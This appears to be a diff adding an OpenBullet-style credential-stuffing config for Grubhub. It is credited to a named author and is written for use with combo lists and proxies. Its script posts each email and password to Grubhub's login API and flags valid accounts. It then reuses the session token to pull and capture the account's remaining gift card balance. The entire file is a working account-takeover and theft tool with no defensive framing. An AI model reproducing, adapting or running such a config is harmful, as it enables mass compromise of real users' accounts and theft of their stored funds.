@@ -1,0 +1,95 @@
+[SETTINGS]
+{
+  "Name": "Grubhub",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-03-19T20:06:45.2577873-04:00",
+  "AdditionalInfo": "",
+  "Author": "Aaron Kong | Privileged Owner#6666",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api-gtm.grubhub.com/auth" 
+  CONTENT "{\"brand\":\"GRUBHUB\",\"client_id\":\"beta_UmWlpstzQSFmocLy3h1UieYcVST\",\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Authorization: Bearer 97bc3f1f-cbca-40de-85e0-2a3a3d15dd04" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36" 
+  HEADER "Accept: */*" 
+
+#Login KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "401" 
+  KEYCHAIN Success OR 
+    KEY "{\"credential\":{\"" 
+
+PARSE "<SOURCE>" JSON "access_token" -> VAR "token" 
+
+PARSE "<SOURCE>" JSON "ud_id" -> VAR "UID" 
+
+REQUEST GET "https://api-gtm.grubhub.com/codes/vault/<UID>/giftcards" 
+  
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "If-Modified-Since: 0" 
+  HEADER "Authorization: Bearer <token>" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36" 
+  HEADER "Origin: https://www.grubhub.com" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Referer: https://www.grubhub.com/account/giftcard" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9,sv;q=0.8" 
+
+PARSE "<SOURCE>" JSON "total_amount_remaining" -> VAR "GC" 
+
+FUNCTION Compute "<GC>/100" -> VAR "GC" 
+
+PARSE "<GC>" LR "" "" CreateEmpty=FALSE -> CAP "Giftcard" "$" "" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "{\"gift_cards\":[],\"total_amount_remaining\":0}" 
+
